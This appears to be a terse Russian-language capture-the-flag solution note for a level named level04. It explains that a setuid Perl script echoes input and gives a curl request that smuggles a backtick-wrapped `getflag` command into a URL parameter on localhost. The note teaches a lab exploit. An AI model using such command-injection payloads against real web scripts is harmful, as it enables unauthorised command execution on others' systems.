```
ls -l
Файл perl, который содержит echo
У файла есть флаг s, значит передадим в echo `getflag`

curl localhost:4747/level04.pl?x=\`getflag\`
```